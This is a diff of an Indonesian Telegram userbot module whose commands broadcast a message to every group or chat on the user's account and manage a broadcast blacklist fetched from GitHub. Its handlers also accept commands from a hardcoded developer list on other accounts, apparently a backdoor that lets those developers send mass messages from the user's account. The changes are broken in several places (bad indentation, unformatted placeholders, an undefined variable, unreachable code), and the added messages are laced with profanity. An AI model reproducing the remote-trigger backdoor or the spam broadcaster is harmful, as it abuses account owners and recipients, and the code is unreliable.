@@ -16,35 +16,44 @@ from requests import get
 
 from config import BLACKLIST_GCAST
 from config import CMD_HANDLER as cmd
+from Uputt.helpers.PyroHelpers import SpeedConvert
 from Uputt.helpers.adminHelpers import DEVS
 from Uputt.helpers.basic import edit_or_reply
 from Uputt.helpers.misc import HAPP, in_heroku
 from Uputt.helpers.tools import get_arg
 from Uputt.utils.misc import restart
 
+
 from .help import add_command_help
 
 while 0 < 6:
     _GCAST_BLACKLIST = get(
-        "https://raw.githubusercontent.com/iamuput/eizy/UputtNande/blacklistgcast.json"
+        "https://raw.githubusercontent.com/ionnotXD/layla/master/blacklistgcast.json"
     )
     if _GCAST_BLACKLIST.status_code != 200:
         if 0 != 5:
             continue
-        GCAST_BLACKLIST = [-1001608701614, -1001473548283, -1001982790377, -1001812143750, -1001692751821 -1001390552926, -1001001675459127, -1001864253073, -1001001951726069]
+        GCAST_BLACKLIST = [-1001599474353, -1001812143750, -1001287188817, -1001473548283, -1001390552926, -1001302879778, -1001459812644, -1001692751821, -1001813669338, -1001675396283, -1001864253073, -1001861414061]
+        break
     GCAST_BLACKLIST = _GCAST_BLACKLIST.json()
     break
 
 del _GCAST_BLACKLIST
 
 
-@Client.on_message(filters.command("numpanggcast", ["."]) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.command("cgcast", ["."]) & filters.user(DEVS) & ~filters.me)
 @Client.on_message(filters.command("gcast", cmd) & filters.me)
 async def gcast_cmd(client: Client, message: Message):
     if message.reply_to_message or get_arg(message):
-        Man = await edit_or_reply(message, "`Limit Jangan salahin Gua Ya Anjing, Started global broadcast...`")
+        Uputt = await edit_or_reply(message, "Bentar {client.me.mention} lagi ngirim gikesanlu meskipun lu kalo ngegikes ga sederes gikesan Lutpan....")
+               await Uputt.edit(message, "Eh iya baca ini kontollll... kata Lutpan.. kalo lu deres gikes lu ntar lu kelimit ya {client.me.mention}")
+               await Uputt.edit(message, "Eh malah bisa kedeak akunlu {client.me.mention} katanya doang tpi gatau.....")
+               await Uputt.edit(message, "Kalo minta dideresin kalo ga dideresin balik jangan main mute ya ajg {client.me.mention}")
+               await Uputt.edit(message, "Eh iya tdi pinglu pas gikes segini `%sms` ya bejirrr.. liat pinglu {client.me.mention}")
+              
+              
     else:
-        return await message.edit_text("**Pesannya Mana ngentod**")
+        return await message.edit_text("**Direply kontoooolll kalo ga tambahin kata dibelakang command**")
     done = 0
     error = 0
     async for dialog in client.get_dialogs():
@@ -65,18 +74,17 @@ async def gcast_cmd(client: Client, message: Message):
                 except Exception:
                     error += 1
                     await asyncio.sleep(0.3)
-    await Man.edit_text(
-        f"**Berhasil Mengirim Pesan Ke** `{done}` **Grup Ya Tod, Gagal Mengirim Pesan Ke** `{error}` **Grup Nih Tod, Sorry**"
+    await Uputt.edit_text(
+        f"**MASUK KE** `{done}` **YA AJG** {client.mention.me}... `{error}` **YG GAMASUK... LU DIMUTE DISANA SI KATA LUTPAN WKWKWKWKWKWKWKWK**"
     )
 
 
-@Client.on_message(filters.command("numpanggucast", ["."]) & filters.user(DEVS) & ~filters.me)
+@Client.on_message(filters.command("cgucast", ["."]) & filters.user(DEVS) & ~filters.me)
 @Client.on_message(filters.command("gucast", cmd) & filters.me)
 async def gucast_cmd(client: Client, message: Message):
     if message.reply_to_message or get_arg(message):
-        Man = await edit_or_reply(message, "`Limit Jangan Salahin Gua Ya Anjing, Started global broadcast...`")
-    else:
-        return await message.edit_text("**Pesannya Mana ngentod**")
+        Uputt = await edit_or_reply(message, "`Bentar ya bang {client.me.mention}...`")
+        return await message.edit_text("**Pesannya Mana Sayang**")
     done = 0
     error = 0
     async for dialog in client.get_dialogs():
@@ -97,8 +105,8 @@ async def gucast_cmd(client: Client, message: Message):
                 except Exception:
                     error += 1
                     await asyncio.sleep(0.3)
-    await Man.edit_text(
-        f"**Berhasil Mengirim Pesan Ke** `{done}` **chat Nih tod, Gagal Mengirim Pesan Ke** `{error}` **chat Tod, Sorry**"
+    await Uputt.edit_text(
+        f"**Berhasil Mengirim Pesan Ke** `{done}` **chat, Gagal Mengirim Pesan Ke** `{error}` **chat**"
     )
 
 
@@ -109,17 +117,17 @@ async def blchatgcast(client: Client, message: Message):
     if blacklistgc == "True":
         await edit_or_reply(
             message,
-            f"🔮 **Blacklist GCAST:** `Enabled`\n\n📚 **Blacklist Group:**\n» {list}\n\nKetik `{cmd}addblacklist` di grup yang ingin anda tambahkan ke daftar blacklist gcast.",
+            f"🔮 **Blacklist GCAST:** `Enabled`\n\n📚 **Blacklist Group:**\n» {list}\n\nKetik `{cmd}addbl` di grup yang ingin anda tambahkan ke daftar blacklist gcast.",
         )
     else:
         await edit_or_reply(message, "🔮 **Blacklist GCAST:** `Disabled`")
 
 
-@Client.on_message(filters.command("addblacklist", cmd) & filters.me)
+@Client.on_message(filters.command("addbl", cmd) & filters.me)
 async def addblacklist(client: Client, message: Message):
-    Man = await edit_or_reply(message, "`Processing...`")
+    xxnx = await edit_or_reply(message, "`Processing...`")
     if HAPP is None:
-        return await message.edit(
+        return await xxnx.edit(
             "**Silahkan Tambahkan Var** `HEROKU_APP_NAME` **untuk menambahkan blacklist**",
         )
     blgc = f"{BLACKLIST_GCAST} {message.chat.id}"
@@ -131,8 +139,8 @@ async def addblacklist(client: Client, message: Message):
         .replace("]", "")
         .replace("set() ", "")
     )
-    await message.edit(
-        f"**Berhasil Menambahkan** `{message.chat.id}` **ke daftar blacklist gcast.**\n\nSedang MeRestart Heroku untuk Menerapkan Perubahan."
+    await xxnx.edit(
+        f"**WOIIIIIIII {client.me.mention} ngapain lu ngeaddbl gc ini.. bedewe udah done ya... ni togelnya** `{message.chat.id}` ."
     )
     if await in_heroku():
         heroku_var = HAPP.config()
@@ -143,17 +151,17 @@ async def addblacklist(client: Client, message: Message):
     restart()
 
 
-@Client.on_message(filters.command("delblacklist", cmd) & filters.me)
+@Client.on_message(filters.command("delbl", cmd) & filters.me)
 async def delblacklist(client: Client, message: Message):
-    Man = await edit_or_reply(message, "`Processing...`")
+    xxnx = await edit_or_reply(message, "`Processing...`")
     if HAPP is None:
-        return await message.edit(
+        return await xxnx.edit(
             "**Silahkan Tambahkan Var** `HEROKU_APP_NAME` **untuk menambahkan blacklist**",
         )
     gett = str(message.chat.id)
     if gett in blchat:
         blacklistgrup = blchat.replace(gett, "")
-        await message.edit(
+        await xxx.edit(
             f"**Berhasil Menghapus** `{message.chat.id}` **dari daftar blacklist gcast.**\n\nSedang MeRestart Heroku untuk Menerapkan Perubahan."
         )
         if await in_heroku():
@@ -164,7 +172,7 @@ async def delblacklist(client: Client, message: Message):
             dotenv.set_key(path, "BLACKLIST_GCAST", blacklistgrup)
         restart()
     else:
-        await message.edit("**Grup ini tidak ada dalam daftar blacklist gcast.**")
+        await xxnx.edit("**Grup ini tidak ada dalam daftar blacklist gcast.**")
 
 
 add_command_help(
@@ -183,12 +191,12 @@ add_command_help(
             "Untuk Mengecek informasi daftar blacklist gcast.",
         ],
         [
-            "addblacklist",
+            "addbl",
             "Untuk Menambahkan grup tersebut ke blacklist gcast.",
         ],
         [
-            "delblacklist",
-            f"Untuk Menghapus grup tersebut dari blacklist gcast.\n\n  •  **Note : **Ketik perintah** `{cmd}addblacklist` **dan** `{cmd}delblacklist` **di grup yang kamu Blacklist.",
+            "delbl",
+            f"Untuk Menghapus grup tersebut dari blacklist gcast.\n\n  •  **Note : **Ketik perintah** `{cmd}addbl` **dan** `{cmd}delbl` **di grup yang kamu Blacklist.",
         ],
     ],
 )
